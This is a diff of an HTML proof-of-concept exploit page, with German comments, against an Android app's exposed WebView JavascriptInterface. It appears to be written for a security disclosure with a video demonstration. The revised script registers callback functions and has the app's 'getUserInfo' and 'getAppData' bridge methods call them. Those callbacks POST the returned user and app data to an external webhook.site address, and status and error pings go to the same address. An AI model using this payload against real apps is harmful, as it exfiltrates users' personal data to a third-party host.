@@ -5,34 +5,38 @@
 </head>
 <body>
     <h1>OSL App Security PoC</h1>
-    <p>Wenn du das siehst, wurde die bösartige URL erfolgreich im WebView geladen.</p>
+    <p>Warte auf Daten-Callback...</p>
 
     <script>
-        // 1. Visueller Beweis für das Video (Alert-Box)
+        // Visueller Beweis für das Video
         alert("Exploit Success: Arbitrary JS Execution inside OSL Context!");
 
-        // 2. Daten-Exfiltration über das anfällige JavascriptInterface
+        // 1. Wir definieren die Callback-Funktionen, die die App aufrufen soll
+        window.handleUserInfo = function(data) {
+            fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ event: "userInfo_callback", data: data })
+            });
+        };
+
+        window.handleAppData = function(data) {
+            fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ event: "appData_callback", data: data })
+            });
+        };
+
+        // 2. Wir rufen die Schnittstelle auf und übergeben die Namen UNSERER Funktionen als String
         try {
             if (window.control) {
-                // Wir übergeben ein Test-Argument, da die Methoden im Code ein String-Argument erwarten
-                var userInfo = window.control.getUserInfo("poc_test");
-                var appData = window.control.getAppData("poc_test");
-
-                // Daten per POST an deinen Webhook senden
-                fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        vulnerability: "Exposed JavascriptInterface",
-                        extracted_userInfo: userInfo || "null/empty",
-                        extracted_appData: appData || "null/empty"
-                    })
-                });
+                window.control.getUserInfo("window.handleUserInfo");
+                window.control.getAppData("window.handleAppData");
             } else {
-                fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d?status=opened_in_regular_browser');
+                fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d?status=no_bridge_detected');
             }
         } catch(e) {
             fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d?error=' + encodeURIComponent(e.message));
